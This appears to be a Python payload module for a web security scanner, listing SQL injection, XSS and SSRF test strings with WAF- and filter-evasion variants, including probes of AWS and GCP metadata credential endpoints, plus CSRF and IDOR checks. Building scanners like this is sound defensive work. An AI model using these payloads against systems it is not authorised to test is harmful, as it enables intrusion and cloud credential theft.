"""
AegisAppSec Attack Payload Database & Evasion Mutator.
Contains targeted, safe DAST verification payloads and evasion variants.
"""
from typing import List, Dict, Any

SQLI_PAYLOADS: List[Dict[str, Any]] = [
    {
        "id": "sqli-err-01",
        "name": "Classic Single-Quote Error Probe",
        "payload": "'",
        "type": "error_based",
        "evasion": "none",
        "description": "Tests for improper quote handling and database syntax error leakage."
    },
    {
        "id": "sqli-auth-02",
        "name": "Tautological Authentication Bypass",
        "payload": "' OR '1'='1",
        "type": "boolean_based",
        "evasion": "none",
        "description": "Injects an always-true boolean condition into SQL WHERE clause."
    },
    {
        "id": "sqli-comment-03",
        "name": "SQL Comment Truncation",
        "payload": "1' OR 1=1 --",
        "type": "boolean_based",
        "evasion": "comment_termination",
        "description": "Evaluates true condition and truncates remaining SQL statement."
    },
    {
        "id": "sqli-union-04",
        "name": "UNION SELECT Data Extraction",
        "payload": "1' UNION SELECT 999, 'AEGIS_SQLI_CONFIRMED', 'admin', 99.99, 'EXPLOIT_VERIFIED' --",
        "type": "union_based",
        "evasion": "none",
        "description": "Appends an auxiliary result row to verify column reflection."
    },
    {
        "id": "sqli-evasion-05",
        "name": "Inline Comment WAF Evasion",
        "payload": "1'/**/OR/**/'1'='1'/**/--",
        "type": "boolean_based",
        "evasion": "inline_comment",
        "description": "Uses SQL inline comments /**/ instead of whitespace to bypass naive regex WAFs."
    },
    {
        "id": "sqli-double-url-06",
        "name": "Double URL Encoded SQLi",
        "payload": "%2527%2520OR%25201%253D1%2520--",
        "type": "boolean_based",
        "evasion": "double_url_encode",
        "description": "Exploits double-decoding flaws in application gateways."
    },
    {
        "id": "sqli-time-07",
        "name": "Time-Based Blind Delay Simulation",
        "payload": "1' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT 1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        "type": "time_based",
        "evasion": "none",
        "description": "Probes for blind SQL injection via execution delay differential."
    }
]

XSS_PAYLOADS: List[Dict[str, Any]] = [
    {
        "id": "xss-script-01",
        "name": "Basic Script Tag Injection",
        "payload": "<script>alert('aegis-xss')</script>",
        "type": "reflected",
        "context": "html_body",
        "evasion": "none",
        "description": "Standard script tag execution in raw HTML body context."
    },
    {
        "id": "xss-img-02",
        "name": "Image Tag OnError Event Handler",
        "payload": "<img src=x onerror=alert('aegis-xss')>",
        "type": "reflected",
        "context": "tag_attribute",
        "evasion": "event_handler",
        "description": "Fires immediate JavaScript via broken image onerror event handler."
    },
    {
        "id": "xss-svg-03",
        "name": "SVG OnLoad Vector",
        "payload": "<svg onload=alert('aegis-xss')>",
        "type": "reflected",
        "context": "svg_context",
        "evasion": "xml_namespace",
        "description": "Triggers JavaScript in inline SVG XML namespace."
    },
    {
        "id": "xss-nested-04",
        "name": "Nested Tag Filter Bypass",
        "payload": "<scr<script>ipt>alert('aegis-xss')</script>",
        "type": "reflected",
        "context": "html_body",
        "evasion": "nested_tag",
        "description": "Bypasses naive single-pass tag stripping sanitizers (e.g. str_replace('<script>', ''))."
    },
    {
        "id": "xss-double-encode-05",
        "name": "Double URL Encoded XSS",
        "payload": "%253Cscript%253Ealert('aegis-xss')%253C/script%253E",
        "type": "reflected",
        "context": "html_body",
        "evasion": "double_url_encode",
        "description": "Evades WAFs that inspect inputs before reverse-proxy URL decoding."
    },
    {
        "id": "xss-quote-break-06",
        "name": "Attribute Quote Break-Out",
        "payload": "\"><script>alert('aegis-xss')</script>",
        "type": "reflected",
        "context": "attribute_breakout",
        "evasion": "quote_break",
        "description": "Breaks out of existing HTML attribute value quotes."
    }
]

SSRF_PAYLOADS: List[Dict[str, Any]] = [
    {
        "id": "ssrf-aws-01",
        "name": "AWS EC2 Instance Metadata Probe",
        "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "type": "cloud_metadata",
        "target_service": "AWS IMDSv1",
        "description": "Probes for unauthenticated cloud instance identity and STS token leakage."
    },
    {
        "id": "ssrf-gcp-02",
        "name": "Google Cloud Metadata Probe",
        "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "type": "cloud_metadata",
        "target_service": "GCP Metadata",
        "description": "Probes for GCP service account OAuth tokens."
    },
    {
        "id": "ssrf-loopback-03",
        "name": "Localhost Internal Service Probe",
        "payload": "http://127.0.0.1:8000/internal-admin",
        "type": "internal_loopback",
        "target_service": "Loopback Admin API",
        "description": "Probes for non-public internal administrative interfaces on loopback."
    },
    {
        "id": "ssrf-hex-ip-04",
        "name": "Hexadecimal IP Evasion (127.0.0.1)",
        "payload": "http://0x7f000001:8000/internal-admin",
        "type": "internal_loopback",
        "target_service": "Hex Loopback",
        "description": "Bypasses naive string matching on '127.0.0.1' or 'localhost'."
    },
    {
        "id": "ssrf-dword-05",
        "name": "Dword/Decimal IP Evasion (127.0.0.1)",
        "payload": "http://2130706433:8000/internal-admin",
        "type": "internal_loopback",
        "target_service": "Decimal Loopback",
        "description": "Uses 32-bit integer IP representation to bypass hostname blocklists."
    }
]

CSRF_PROBES: List[Dict[str, Any]] = [
    {
        "id": "csrf-missing-token-01",
        "name": "Missing Anti-CSRF Token Validation",
        "method": "POST",
        "description": "Tests if state-changing requests execute without a cryptographic anti-CSRF token."
    },
    {
        "id": "csrf-samesite-check-02",
        "name": "Weak Cookie SameSite Attribute",
        "method": "POST",
        "description": "Checks if session cookies lack SameSite=Strict or SameSite=Lax flags."
    },
    {
        "id": "csrf-origin-spoof-03",
        "name": "Origin / Referer Header Manipulation",
        "method": "POST",
        "description": "Tests if endpoint accepts requests with arbitrary or stripped Origin headers."
    }
]

IDOR_PROBES: List[Dict[str, Any]] = [
    {
        "id": "idor-horizontal-01",
        "name": "Direct Object Identifier Parameter Tampering",
        "tamper_field": "order_id",
        "test_values": [1, 2, 3, 99, 100],
        "description": "Probes adjacent object IDs to determine if tenant authorization checks are enforced."
    }
]
